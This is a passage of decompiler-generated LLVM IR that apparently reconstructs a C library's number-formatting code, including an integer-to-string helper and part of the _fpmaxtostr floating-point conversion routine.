  %v1_8051ed6 = icmp eq i32 %v0_8051eda, 0
  br i1 %v1_8051ed6, label %dec_label_pc_8051f0d, label %dec_label_pc_8051eda

dec_label_pc_8051eda:                             ; preds = %dec_label_pc_8051ed6
  %v0_8051ede = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8051eda, %v0_8051ede
  %tmp36 = urem i32 %v0_8051eda, %v0_8051ede
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8051f0d, %v0_8051ede
  %tmp37 = urem i32 %v0_8051f0d, %v0_8051ede
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8051ef1 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8051ef5 = add i32 %tmp37, %v6_8051ef1
  %v8_8051efb = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8051f00 = add i32 %div8, %v8_8051efb
  store i32 %v2_8051f00, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8051ef5, %v0_8051ede
  %tmp38 = urem i32 %v2_8051ef5, %v0_8051ede
  %v2_8051f08 = add i32 %div9, %v2_8051f00
  br label %dec_label_pc_8051f15

dec_label_pc_8051f0d:                             ; preds = %dec_label_pc_8051ed6
  %v0_8051f11 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8051f0d, %v0_8051f11
  %tmp39 = urem i32 %v0_8051f0d, %v0_8051f11
  br label %dec_label_pc_8051f15

dec_label_pc_8051f15:                             ; preds = %dec_label_pc_8051eda, %dec_label_pc_8051f0d
  %v0_8051f1b = phi i32 [ %tmp38, %dec_label_pc_8051eda ], [ %tmp39, %dec_label_pc_8051f0d ]
  %storemerge = phi i32 [ %v2_8051f08, %dec_label_pc_8051eda ], [ %div12, %dec_label_pc_8051f0d ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8051f15 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f15 = add i32 %v0_8051f15, -1
  store i32 %v1_8051f15, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8051f1b, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8051f1b
  %v8_8051f1b = trunc i32 %storemerge14.in to i8
  %v3_8051f24 = inttoptr i32 %v1_8051f15 to i8*
  store i8 %v8_8051f1b, i8* %v3_8051f24, align 1
  %v0_8051f26 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051f28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051f28 = or i32 %v1_8051f28, %v0_8051f26
  %v3_8051f28 = icmp eq i32 %v2_8051f28, 0
  %v1_8051f2a = icmp eq i1 %v3_8051f28, false
  br i1 %v1_8051f2a, label %dec_label_pc_8051ed6, label %dec_label_pc_8051f2c

dec_label_pc_8051f2c:                             ; preds = %dec_label_pc_8051f15
  %v4_8051f2c = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8051f2c, label %dec_label_pc_8051f37, label %dec_label_pc_8051f33

dec_label_pc_8051f33:                             ; preds = %dec_label_pc_8051f2c
  %v0_8051f33 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f33 = add i32 %v0_8051f33, -1
  store i32 %v1_8051f33, i32* %edi.global-to-local, align 4
  %v1_8051f34 = inttoptr i32 %v1_8051f33 to i8*
  store i8 45, i8* %v1_8051f34, align 1
  br label %dec_label_pc_8051f37

dec_label_pc_8051f37:                             ; preds = %dec_label_pc_8051f2c, %dec_label_pc_8051f33
  %v0_8051f3a = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051f3a

; uselistorder directives
  uselistorder i32 %v2_8051ef5, { 1, 0 }
  uselistorder i32 %v0_8051ede, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8051eda, { 1, 0, 2 }
  uselistorder i32 %v0_8051f0d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051eaf, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f37, { 1, 0 }
  uselistorder label %dec_label_pc_8051f15, { 1, 0 }
  uselistorder label %dec_label_pc_8051ece, { 1, 0 }
  uselistorder label %dec_label_pc_8051eaa, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051f45 = load i32, i32* @edi, align 4
  %v0_8051f46 = load i32, i32* @esi, align 4
  %v0_8051f47 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f47, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8051f5c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8051f5c = add i3 %v4_8051f5c, -1
  store i3 %v5_8051f5c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8051f63 = add i32 %tmp112, 4
  %v2_8051f63 = inttoptr i32 %v1_8051f63 to i32*
  %v3_8051f63 = load i32, i32* %v2_8051f63, align 4
  store i32 %v3_8051f63, i32* %eax.global-to-local, align 4
  %v1_8051f6a = add i32 %tmp112, 8
  %v2_8051f6a = inttoptr i32 %v1_8051f6a to i8*
  %v3_8051f6a = load i8, i8* %v2_8051f6a, align 1
  %v4_8051f6a = zext i8 %v3_8051f6a to i32
  %v5_8051f6a = load i32, i32* @ecx, align 4
  %v6_8051f6a = and i32 %v5_8051f6a, -256
  %v7_8051f6a = or i32 %v6_8051f6a, %v4_8051f6a
  store i32 %v7_8051f6a, i32* %ecx.global-to-local, align 4
  %v1_8051f6d = inttoptr i32 %tmp112 to i32*
  %v2_8051f6d = load i32, i32* %v1_8051f6d, align 4
  store i32 %v2_8051f6d, i32* %ebp.global-to-local, align 4
  %v3_8051f6f = and i32 %v3_8051f63, -256
  %v4_8051f6f = or i32 %v3_8051f6f, %v4_8051f6a
  %v1_8051f75 = or i32 %v4_8051f6f, 32
  %v3_8051f75 = trunc i32 %v1_8051f75 to i8
  store i32 %v1_8051f75, i32* %eax.global-to-local, align 4
  %v10_8051f80 = icmp eq i8 %v3_8051f75, 97
  %v1_8051f82 = icmp eq i1 %v10_8051f80, false
  br i1 %v1_8051f82, label %dec_label_pc_8051f8b, label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %entry
  %v1_8051f84 = add i32 %v7_8051f6a, 6
  %v11_8051f84 = trunc i32 %v1_8051f84 to i8
  store i32 %v1_8051f84, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f8b

dec_label_pc_8051f8b:                             ; preds = %entry, %dec_label_pc_8051f84
  %stack_var_-206.0 = phi i8 [ %v3_8051f6a, %entry ], [ %v11_8051f84, %dec_label_pc_8051f84 ]
  %v2_8051f8b = icmp slt i32 %v2_8051f6d, 0
  %v1_8051f8d = icmp eq i1 %v2_8051f8b, false
  br i1 %v1_8051f8d, label %dec_label_pc_8051f94, label %dec_label_pc_8051f8f

dec_label_pc_8051f8f:                             ; preds = %dec_label_pc_8051f8b
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051f94

dec_label_pc_8051f94:                             ; preds = %dec_label_pc_8051f8b, %dec_label_pc_8051f8f
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8051fa3 = add i32 %tmp112, 12
  %v2_8051fa3 = inttoptr i32 %v1_8051fa3 to i32*
  %v3_8051fa3 = load i32, i32* %v2_8051fa3, align 4
  store i32 %v3_8051fa3, i32* %eax.global-to-local, align 4
  %v2_8051fa6 = and i32 %v3_8051fa3, 2
  %v3_8051fa6 = icmp eq i32 %v2_8051fa6, 0
  br i1 %v3_8051fa6, label %dec_label_pc_8051fb4, label %dec_label_pc_8051fc0

dec_label_pc_8051fb4:                             ; preds = %dec_label_pc_8051f94
  %v2_8051fb4 = urem i32 %v3_8051fa3, 2
  %tmp143 = trunc i32 %v2_8051fb4 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8051fc0

dec_label_pc_8051fc0:                             ; preds = %dec_label_pc_8051fb4, %dec_label_pc_8051f94
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8051f94 ], [ %tmp144, %dec_label_pc_8051fb4 ]
  %v1_8051fd4 = udiv i32 %v3_8051fa3, 256
  %tmp146 = and i32 %v1_8051fd4, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8052126, label %dec_label_pc_8052046

dec_label_pc_8052046:                             ; preds = %dec_label_pc_8051fc0
  store i3 %v4_8051f5c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805204d = add i32 %tmp112, 16
  %v2_805204d = inttoptr i32 %v1_805204d to i32*
  store i32 32, i32* %v2_805204d, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_8052064 = add i8 %stack_var_-206.0, -96
  %v6_8052064 = sub i8 95, %stack_var_-206.0
  %v7_8052064 = and i8 %v6_8052064, %stack_var_-206.0
  %v8_8052064 = icmp slt i8 %v7_8052064, 0
  %v9_8052064 = icmp eq i8 %v4_8052064, 0
  %v10_8052064 = icmp slt i8 %v4_8052064, 0
  %v3_8052069 = icmp eq i1 %v10_8052064, %v8_8052064
  %v4_8052069 = icmp eq i1 %v9_8052064, false
  %v5_8052069 = and i1 %v4_8052069, %v3_8052069
  br i1 %v5_8052069, label %dec_label_pc_8052070, label %dec_label_pc_805206b

dec_label_pc_805206b:                             ; preds = %dec_label_pc_8052046
  br label %dec_label_pc_8052070

dec_label_pc_8052070:                             ; preds = %dec_label_pc_8052046, %dec_label_pc_805206b
  %v2_8052078 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052078, i32* @ecx, align 4
  br label %dec_label_pc_805244b

dec_label_pc_8052126:                             ; preds = %dec_label_pc_8051fc0
  %v1_8051fe5 = add i3 %v4_8051f5c, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805212a = and i32 %v3_8051fa3, -65536
  %v2_805212f = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_805212f, i32* %edx.global-to-local, align 4
  %v1_8052136 = udiv i16 %tmp103, 256
  %v2_8052136 = zext i16 %v1_8052136 to i32
  %v3_8052136 = mul nuw nsw i32 %v2_8052136, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_805212a.masked = zext i16 %tmp148 to i32
  %v11_8052136 = or i32 %v4_805212a.masked, %v3_8052136
  %v10_8052136 = or i32 %v11_8052136, %v6_805212a
  %v12_8052136 = or i32 %v10_8052136, 3072
  store i32 %v12_8052136, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8051fe5, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805214a

dec_label_pc_805214a:                             ; preds = %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge, %dec_label_pc_8052126
  %v2_8052167 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8052126 ], [ %v2_8052167.pre, %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge ]
  %v1_805214a = phi i3 [ %v1_8051fe5, %dec_label_pc_8052126 ], [ %v1_805214a.pre, %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge ]
  %v3_8052171 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8052126 ], [ %v0_805214a.pre, %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805212f, %dec_label_pc_8052126 ], [ %v4_805216c, %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_8052171 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_8052164 = sitofp i32 %tmp149 to x86_fp80
  %v4_8052167 = fsub x86_fp80 %v2_8052167, %v5_8052164
  store i3 %v1_805214a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805216c = add i32 %stack_var_-212.0, 9
  %v4_8052171 = fmul x86_fp80 %v3_8052171, %v4_8052167
  store x86_fp80 %v4_8052171, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8052173

dec_label_pc_8052173:                             ; preds = %dec_label_pc_8052173.dec_label_pc_8052173_crit_edge, %dec_label_pc_805214a
  %v0_8052185 = phi i32 [ %v0_8052185.pre, %dec_label_pc_8052173.dec_label_pc_8052173_crit_edge ], [ %tmp149, %dec_label_pc_805214a ]
  %v0_8052173 = phi i32 [ %v0_8052173.pre, %dec_label_pc_8052173.dec_label_pc_8052173_crit_edge ], [ 0, %dec_label_pc_805214a ]
  %v1_8052173 = add i32 %v0_8052173, 1
  store i32 %v1_8052173, i32* %esi.global-to-local, align 4
  %v2_8052178 = sub i32 %v4_805216c, %v1_8052173
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8052185, 10
  %tmp136 = urem i32 %v0_8052185, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052178, i32* %eax.global-to-local, align 4
  %v1_8052191 = or i32 %tmp136, 48
  %v8_8052191 = trunc i32 %v1_8052191 to i8
  store i32 %v1_8052191, i32* %edx.global-to-local, align 4
  %v3_8052197 = inttoptr i32 %v2_8052178 to i8*
  store i8 %v8_8052191, i8* %v3_8052197, align 1
  %v7_8052199 = icmp sgt i32 %v1_8052173, 8
  br i1 %v7_8052199, label %dec_label_pc_805219b, label %dec_label_pc_8052173.dec_label_pc_8052173_crit_edge

dec_label_pc_8052173.dec_label_pc_8052173_crit_edge: ; preds = %dec_label_pc_8052173
  %v0_8052173.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8052185.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052173

dec_label_pc_805219b:                             ; preds = %dec_label_pc_8052173
  %v0_805219b = load i32, i32* @edi, align 4
  %v1_805219b = add i32 %v0_805219b, 1
  store i32 %v1_805219b, i32* @edi, align 4
  %v7_805219f = icmp sgt i32 %v1_805219b, 2
  br i1 %v7_805219f, label %dec_label_pc_80521a1, label %dec_label_pc_805219b.dec_label_pc_805214a_crit_edge

dec_label_pc_805219b.dec_label_pc_805214a_crit_edge: ; preds = %dec_label_pc_805219b
  %v0_805214a.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805214a.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8052167.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805214a

dec_label_pc_80521a1:                             ; preds = %dec_label_pc_805219b
  %v0_80521a1 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80521a1 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80521a1, x86_fp80* %st0.global-to-local, align 4
  %v2_80521a3 = add i3 %v0_80521a1, 2
  store i3 %v2_80521a3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80521a5 = add i8 %stack_var_-206.0, -96
  %v6_80521a5 = sub i8 95, %stack_var_-206.0
  %v7_80521a5 = and i8 %v6_80521a5, %stack_var_-206.0
  %v8_80521a5 = icmp slt i8 %v7_80521a5, 0
  %v9_80521a5 = icmp eq i8 %v4_80521a5, 0
  %v10_80521a5 = icmp slt i8 %v4_80521a5, 0
  %v3_80521aa = icmp eq i1 %v10_80521a5, %v8_80521a5
  %v4_80521aa = icmp eq i1 %v9_80521a5, false
  %v5_80521aa = and i1 %v4_80521aa, %v3_80521aa
  br i1 %v5_80521aa, label %dec_label_pc_80521b9, label %dec_label_pc_80521ac

dec_label_pc_80521ac:                             ; preds = %dec_label_pc_80521a1
  %v4_80521ac = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80521b9

dec_label_pc_80521b9:                             ; preds = %dec_label_pc_80521a1, %dec_label_pc_80521ac
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80521a1 ], [ %v4_80521ac, %dec_label_pc_80521ac ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80521a1 ], [ 69, %dec_label_pc_80521ac ]
  %v12_80521b9 = icmp eq i8 %stack_var_-206.1, 103
  %v1_80521be = icmp eq i1 %v12_80521b9, false
  br i1 %v1_80521be, label %dec_label_pc_80521c7, label %dec_label_pc_80521c0

dec_label_pc_80521c0:                             ; preds = %dec_label_pc_80521b9
  %v0_80521c0 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_80521c0, 1
  br i1 %tmp137, label %dec_label_pc_80521ce, label %dec_label_pc_80521c4

dec_label_pc_80521c4:                             ; preds = %dec_label_pc_80521c0
  %v1_80521c4 = add i32 %v0_80521c0, -1
  store i32 %v1_80521c4, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80521ce

dec_label_pc_80521c7:                             ; preds = %dec_label_pc_80521b9
  %v12_80521c7 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_80521c7, label %dec_label_pc_80521d2, label %dec_label_pc_80521c7.dec_label_pc_80521ce_crit_edge

dec_label_pc_80521c7.dec_label_pc_80521ce_crit_edge: ; preds = %dec_label_pc_80521c7
  %v0_80521ce.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80521ce

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_80521c7.dec_label_pc_80521ce_crit_edge, %dec_label_pc_80521c0, %dec_label_pc_80521c4
  %v0_80521ce = phi i32 [ %v0_80521ce.pre, %dec_label_pc_80521c7.dec_label_pc_80521ce_crit_edge ], [ %v0_80521c0, %dec_label_pc_80521c0 ], [ %v1_80521c4, %dec_label_pc_80521c4 ]
  store i32 %v0_80521ce, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521ff

dec_label_pc_80521d2:                             ; preds = %dec_label_pc_80521c7
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_80521d6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80521d6 = add i32 %v0_80521d6, -1
  store i32 %v2_80521d6, i32* %ebx.global-to-local, align 4
  %v5_80521dd = icmp slt i32 %v2_80521d6, -1
  br i1 %v5_80521dd, label %dec_label_pc_80521df, label %dec_label_pc_80521ff

dec_label_pc_80521df:                             ; preds = %dec_label_pc_80521d2
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80521e7 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80521e7, i32* %eax.global-to-local, align 4
  %v4_80521ef = bitcast i32* %stack_var_-72 to i8*
  %v5_80521ef = call i32 @__GI_memset(i8* %v4_80521ef, i32 48, i32 21)
  store i32 %v5_80521ef, i32* %eax.global-to-local, align 4
  %v0_805220f.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521ff

dec_label_pc_80521ff:                             ; preds = %dec_label_pc_80521d2, %dec_label_pc_80521df, %dec_label_pc_80521ce
  %v1_805221f = phi i32 [ %v0_80521ce, %dec_label_pc_80521ce ], [ %v0_805220f.pr.pre, %dec_label_pc_80521df ], [ %v2_80521d6, %dec_label_pc_80521d2 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8052212 = icmp sgt i32 %v1_805221f, 20
  br i1 %v7_8052212, label %dec_label_pc_8052214, label %dec_label_pc_805221f

dec_label_pc_8052214:                             ; preds = %dec_label_pc_80521ff
  %v2_8052214 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8052214, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052233.preheader

dec_label_pc_805221f:                             ; preds = %dec_label_pc_80521ff
  %v0_805221f = load i32, i32* @esp, align 4
  %v2_805221f = add i32 %v1_805221f, 165
  %v3_805221f = add i32 %v2_805221f, %v0_805221f
  store i32 %v3_805221f, i32* %eax.global-to-local, align 4
  %v1_8052226 = add i32 %v3_805221f, 2
  store i32 %v1_8052226, i32* %ecx.global-to-local, align 4
  %v2_8052229 = inttoptr i32 %v1_8052226 to i8*
  %v3_8052229 = load i8, i8* %v2_8052229, align 1
  %v4_8052229 = add i8 %v3_8052229, -53
  %v9_8052229 = sub i8 52, %v3_8052229
  %v10_8052229 = and i8 %v9_8052229, %v3_8052229
  %v11_8052229 = icmp slt i8 %v10_8052229, 0
  %v13_8052229 = icmp slt i8 %v4_8052229, 0
  %v2_805222d = icmp eq i1 %v13_8052229, %v11_8052229
  %v3_805222d = zext i1 %v2_805222d to i32
  br label %dec_label_pc_8052233.preheader

dec_label_pc_8052233.preheader:                   ; preds = %dec_label_pc_805221f, %dec_label_pc_8052214
  %v0_805223363 = phi i32 [ %v1_8052226, %dec_label_pc_805221f ], [ %v2_8052214, %dec_label_pc_8052214 ]
  %storemerge52 = phi i32 [ %v3_805222d, %dec_label_pc_805221f ], [ 0, %dec_label_pc_8052214 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_8052233.backedge, %dec_label_pc_8052233.preheader
  %v3_8052234 = phi i32 [ %v3_8052234.pre, %dec_label_pc_8052233.backedge ], [ %storemerge52, %dec_label_pc_8052233.preheader ]
  %v0_8052233 = phi i32 [ %v0_8052236, %dec_label_pc_8052233.backedge ], [ %v0_805223363, %dec_label_pc_8052233.preheader ]
  %v1_8052233 = add i32 %v0_8052233, -1
  store i32 %v1_8052233, i32* %ecx.global-to-local, align 4
  %v1_8052234 = inttoptr i32 %v1_8052233 to i8*
  %v2_8052234 = load i8, i8* %v1_8052234, align 1
  %v4_8052234 = trunc i32 %v3_8052234 to i8
  %v5_8052234 = add i8 %v2_8052234, %v4_8052234
  store i8 %v5_8052234, i8* %v1_8052234, align 1
  %v0_8052236 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052236 = inttoptr i32 %v0_8052236 to i8*
  %v2_8052236 = load i8, i8* %v1_8052236, align 1
  %v3_8052236 = zext i8 %v2_8052236 to i32
  %v4_8052236 = load i32, i32* %edx.global-to-local, align 4
  %v5_8052236 = and i32 %v4_8052236, -256
  %v6_8052236 = or i32 %v5_8052236, %v3_8052236
  store i32 %v6_8052236, i32* %edx.global-to-local, align 4
  %v7_8052238 = icmp eq i8 %v2_8052236, 48
  br i1 %v7_8052238, label %dec_label_pc_8052233.backedge, label %dec_label_pc_805223d

dec_label_pc_8052233.backedge:                    ; preds = %dec_label_pc_8052233, %dec_label_pc_805223d
  %v3_8052234.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052233

dec_label_pc_805223d:                             ; preds = %dec_label_pc_8052233
  %v2_805223d = add i8 %v2_8052236, -57
  %v7_805223d = sub i8 56, %v2_8052236
  %v8_805223d = and i8 %v7_805223d, %v2_8052236
  %v9_805223d = icmp slt i8 %v8_805223d, 0
  %v10_805223d = icmp eq i8 %v2_805223d, 0
  %v11_805223d = icmp slt i8 %v2_805223d, 0
  %v3_8052240 = icmp eq i1 %v11_805223d, %v9_805223d
  %v4_8052240 = icmp eq i1 %v10_805223d, false
  %v5_8052240 = and i1 %v4_8052240, %v3_8052240
  br i1 %v5_8052240, label %dec_label_pc_8052233.backedge, label %dec_label_pc_8052242

dec_label_pc_8052242:                             ; preds = %dec_label_pc_805223d
  %v2_8052242 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8052242, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8052236, %v2_8052242
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_805224d, label %dec_label_pc_805225a

dec_label_pc_805224d:                             ; preds = %dec_label_pc_8052242
  store i32 %v2_805212f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052263

dec_label_pc_805225a:                             ; preds = %dec_label_pc_8052242
  store i32 %v2_8052242, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8052242, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052263

dec_label_pc_8052263:                             ; preds = %dec_label_pc_805224d, %dec_label_pc_805225a
  %v0_8052263 = phi i32 [ %v0_8052236, %dec_label_pc_805224d ], [ %v2_8052242, %dec_label_pc_805225a ]
  %v1_8052263 = add i32 %v0_8052263, 1
  store i32 %v1_8052263, i32* %eax.global-to-local, align 4
  %v2_805226a = inttoptr i32 %v1_8052263 to i8*
  store i8 0, i8* %v2_805226a, align 1
  br i1 %v1_80521be, label %dec_label_pc_8052290, label %dec_label_pc_8052275

dec_label_pc_8052275:                             ; preds = %dec_label_pc_8052263
  %v0_8052275 = load i32, i32* %esi.global-to-local, align 4
  %v5_8052278 = icmp slt i32 %v0_8052275, -4
  br i1 %v5_8052278, label %dec_label_pc_805229d, label %dec_label_pc_805227a

dec_label_pc_805227a:                             ; preds = %dec_label_pc_8052275
  %v1_805227a = load i32, i32* %ebx.global-to-local, align 4
  %v7_805227c = icmp slt i32 %v1_805227a, %v0_8052275
  br i1 %v7_805227c, label %dec_label_pc_805229d, label %dec_label_pc_8052285

dec_label_pc_8052285:                             ; preds = %dec_label_pc_805227a
  %v2_805228c = sub i32 %v1_805227a, %v0_8052275
  store i32 %v2_805228c, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80522a1

dec_label_pc_8052290:                             ; preds = %dec_label_pc_8052263
  %v4_8052290 = zext i8 %stack_var_-206.1 to i32
  %v5_8052290 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8052290 = and i32 %v5_8052290, -256
  %v7_8052290 = or i32 %v6_8052290, %v4_8052290
  store i32 %v7_8052290, i32* %ecx.global-to-local, align 4
  %v10_8052298 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8052298, label %dec_label_pc_8052290.dec_label_pc_80522a1_crit_edge, label %dec_label_pc_805229d

dec_label_pc_8052290.dec_label_pc_80522a1_crit_edge: ; preds = %dec_label_pc_8052290
  %v0_80522a1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80522a1

dec_label_pc_805229d:                             ; preds = %dec_label_pc_8052275, %dec_label_pc_805227a, %dec_label_pc_8052290
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8052290 ], [ 103, %dec_label_pc_805227a ], [ 103, %dec_label_pc_8052275 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522ab

dec_label_pc_80522a1:                             ; preds = %dec_label_pc_8052290.dec_label_pc_80522a1_crit_edge, %dec_label_pc_8052285
  %v0_80522a1 = phi i32 [ %v0_80522a1.pre, %dec_label_pc_8052290.dec_label_pc_80522a1_crit_edge ], [ %v0_8052275, %dec_label_pc_8052285 ]
  store i32 %v0_80522a1, i32* %ebx.global-to-local, align 4
  %v2_80522a3 = icmp slt i32 %v0_80522a1, 0
  %v1_80522a5 = icmp eq i1 %v2_80522a3, false
  br i1 %v1_80522a5, label %dec_label_pc_80522ab, label %dec_label_pc_80522a7

dec_label_pc_80522a7:                             ; preds = %dec_label_pc_80522a1
  %v0_80522a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522a7 = add i32 %v0_80522a7, -1
  store i32 %v1_80522a7, i32* %edx.global-to-local, align 4
  %v1_80522a8 = inttoptr i32 %v1_80522a7 to i8*
  store i8 48, i8* %v1_80522a8, align 1
  %v0_80522e0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522ab

dec_label_pc_80522ab:                             ; preds = %dec_label_pc_80522a1, %dec_label_pc_805229d, %dec_label_pc_80522a7
  %v1_805233b = phi i32 [ %v0_80522a1, %dec_label_pc_80522a1 ], [ %v0_80522e0.pre, %dec_label_pc_80522a7 ], [ 0, %dec_label_pc_805229d ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80522a1 ], [ 102, %dec_label_pc_80522a7 ], [ %stack_var_-197.0, %dec_label_pc_805229d ]
